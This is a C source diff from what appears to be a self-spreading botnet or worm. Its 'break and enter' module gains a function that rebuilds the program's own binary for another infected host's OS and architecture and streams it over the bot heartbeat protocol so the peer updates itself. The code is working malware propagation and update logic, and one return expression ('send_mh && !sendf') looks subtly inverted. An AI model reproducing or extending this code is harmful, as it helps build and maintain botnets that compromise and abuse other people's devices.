@@ -28,6 +28,14 @@ static const struct timespec BNE_ERR_PAUSE = { 0, 500000000 }; // 500ms
 static const struct timespec BNE_PROMPT_PAUSE = { 4, 0 }; // 4s
 static const uint64_t BNE_M2M_UPBIN_INT = 43200; // 12 hours
 
+static const size_t BNE_STDIO_IB_SIZE[] = {
+#if !PRNE_USE_MIN_MEM
+	PRNE_HTBT_STDIO_LEN_MAX,
+#endif
+	512,
+	0
+};
+
 #define BNE_CONN_ATTEMPT 3
 
 #define BNE_HDELAY_TYPE_MIN		150		// 150ms
@@ -1949,6 +1957,44 @@ static ssize_t bne_vhtbt_write (
 	}
 }
 
+static bool bne_vhtbt_flush (
+	prne_bne_t *ctx,
+	bne_vhtbt_ctx_t *vctx,
+	const void *buf,
+	size_t len,
+	pth_event_t ev)
+{
+	ssize_t io_ret;
+
+	while (len > 0) {
+		io_ret = bne_vhtbt_write(ctx, vctx, buf, len, ev);
+		if (io_ret < 0) {
+			return false;
+		}
+		if (io_ret == 0) {
+			return false;
+		}
+
+		buf = (const uint8_t*)buf + io_ret;
+		len -= io_ret;
+	}
+
+	return true;
+}
+
+static bool bne_vhtbt_flush_ib (
+	prne_bne_t *ctx,
+	bne_vhtbt_ctx_t *vctx,
+	prne_iobuf_t *ib,
+	pth_event_t ev)
+{
+	const bool ret = bne_vhtbt_flush(ctx, vctx, ib->m, ib->len, ev);
+	if (ret) {
+		prne_iobuf_reset(ib);
+	}
+	return ret;
+}
+
 static bool bne_vhtbt_recvf (
 	prne_bne_t *ctx,
 	bne_vhtbt_ctx_t *vctx,
@@ -2189,12 +2235,9 @@ static bool bne_vhtbt_do_upbin_us (
 
 	mh.id = prne_htbt_gen_msgid(&ctx->rnd, bne_vhtbt_msgid_f);
 	mh.op = PRNE_HTBT_OP_RCB;
+	rcb_f.os = PRNE_HOST_OS;
 	rcb_f.arch = PRNE_HOST_ARCH;
 	rcb_f.compat = true;
-	prne_pth_reset_timer(ev, &BNE_SCK_OP_TIMEOUT);
-	if (!bne_vhtbt_do_ayt(ctx, vctx, ev)) {
-		goto END;
-	}
 
 	prne_pth_reset_timer(ev, &BNE_SCK_OP_TIMEOUT);
 	if (!bne_vhtbt_send_mh(ctx, vctx, &mh, *ev)) {
@@ -2260,6 +2303,8 @@ static bool bne_vhtbt_do_upbin_us (
 				prne_iobuf_shift(&vctx->stdioib, -f_ret);
 			}
 		}
+
+		pth_yield(NULL);
 	} while (!stdio_f.fin);
 	ctx->param.cb.upbin(ctx->param.cb_ctx, tmpfile_path, &cmd);
 	ret = true;
@@ -2281,11 +2326,116 @@ END:
 static bool bne_vhtbt_do_upbin_them (
 	prne_bne_t *ctx,
 	bne_vhtbt_ctx_t *vctx,
+	const prne_htbt_host_info_t *hi,
 	pth_event_t *ev)
 {
-	// TODO
-	errno = ENOSYS;
-	return false;
+	bool ret = false;
+	prne_bin_rcb_ctx_t rcbctx;
+	prne_pack_rc_t prc;
+	prne_bin_host_t target;
+	prne_htbt_msg_head_t mh;
+	prne_htbt_bin_meta_t bm;
+	prne_htbt_stdio_t sh;
+	prne_iobuf_t rcb_ib;
+	ssize_t io_ret;
+	int perr = 0;
+
+	prne_init_bin_rcb_ctx(&rcbctx);
+	prne_htbt_init_msg_head(&mh);
+	prne_htbt_init_bin_meta(&bm);
+	prne_htbt_init_stdio(&sh);
+	prne_init_iobuf(&rcb_ib);
+
+	if (!prne_try_alloc_iobuf(&rcb_ib, BNE_STDIO_IB_SIZE)) {
+		goto END;
+	}
+
+	target.os = hi->os;
+	target.arch = hi->arch;
+
+	prc = prne_start_bin_rcb_compat(
+		&rcbctx,
+		target,
+		ctx->param.rcb->self,
+		ctx->param.rcb->m_self,
+		ctx->param.rcb->self_len,
+		ctx->param.rcb->exec_len,
+		ctx->param.rcb->m_dv,
+		ctx->param.rcb->dv_len,
+		ctx->param.rcb->ba,
+		NULL);
+	if (prc != PRNE_PACK_RC_OK) {
+		goto END;
+	}
+
+	mh.id = prne_htbt_gen_msgid(&ctx->rnd, bne_vhtbt_msgid_f);
+	mh.op = PRNE_HTBT_OP_UP_BIN;
+	bm.alloc_len = prne_op_min(
+		ctx->param.rcb->self_len,
+		PRNE_HTBT_BIN_ALLOC_LEN_MAX);
+	prne_pth_reset_timer(ev, &BNE_SCK_OP_TIMEOUT);
+	if (!bne_vhtbt_send_mh(ctx, vctx, &mh, *ev) ||
+		!bne_vhtbt_sendf(
+			ctx,
+			vctx,
+			&bm,
+			(prne_htbt_ser_ft)prne_htbt_ser_bin_meta,
+			*ev))
+	{
+		goto END;
+	}
+
+	mh.op = PRNE_HTBT_OP_STDIO;
+	do {
+		prne_pth_reset_timer(ev, &BNE_SCK_OP_TIMEOUT);
+
+		io_ret = prne_bin_rcb_read(
+			&rcbctx,
+			rcb_ib.m,
+			rcb_ib.avail,
+			&prc,
+			&perr);
+		if (io_ret < 0) {
+			goto END;
+		}
+		prne_iobuf_shift(&rcb_ib, io_ret);
+
+		if (rcb_ib.len > 0) {
+			sh.len = rcb_ib.len;
+			if (!bne_vhtbt_send_mh(ctx, vctx, &mh, *ev) ||
+				!bne_vhtbt_sendf(
+					ctx,
+					vctx,
+					&sh,
+					(prne_htbt_ser_ft)prne_htbt_ser_stdio,
+					*ev) ||
+				!bne_vhtbt_flush_ib(ctx, vctx, &rcb_ib, *ev))
+			{
+				goto END;
+			}
+		}
+
+		pth_yield(NULL);
+	} while (prc != PRNE_PACK_RC_EOF);
+	sh.fin = true;
+	sh.len = 0;
+	prne_pth_reset_timer(ev, &BNE_SCK_OP_TIMEOUT);
+	ret =
+		bne_vhtbt_send_mh(ctx, vctx, &mh, *ev) &&
+		!bne_vhtbt_sendf(
+			ctx,
+			vctx,
+			&sh,
+			(prne_htbt_ser_ft)prne_htbt_ser_stdio,
+			*ev);
+
+END:
+	prne_free_iobuf(&rcb_ib);
+	prne_free_bin_rcb_ctx(&rcbctx);
+	prne_htbt_free_msg_head(&mh);
+	prne_htbt_free_bin_meta(&bm);
+	prne_htbt_free_stdio(&sh);
+	return ret;
 }
 
 static bool bne_do_vec_htbt (prne_bne_t *ctx) {
@@ -2344,6 +2494,9 @@ static bool bne_do_vec_htbt (prne_bne_t *ctx) {
 			if (ctx->param.cb.uptime(ctx->param.cb_ctx) < BNE_M2M_UPBIN_INT) {
 				break;
 			}
+			if (!bne_vhtbt_do_ayt(ctx, &vctx, &ev)) {
+				goto END;
+			}
 			if (!bne_vhtbt_do_upbin_us(ctx, &vctx, &ev)) {
 				goto END;
 			}
@@ -2352,8 +2505,16 @@ static bool bne_do_vec_htbt (prne_bne_t *ctx) {
 			if (hi.parent_uptime < BNE_M2M_UPBIN_INT) {
 				break;
 			}
-			if (!bne_vhtbt_do_upbin_them(ctx, &vctx, &ev)) {
+			if (!bne_vhtbt_do_ayt(ctx, &vctx, &ev)) {
 				goto END;
+			}
+			if (ctx->param.rcb != NULL) {
+				if (!bne_vhtbt_do_upbin_them(ctx, &vctx, &hi, &ev)) {
+					goto END;
+				}
+			}
+			else {
+				// TODO
 			}
 		}
 	} while (false);
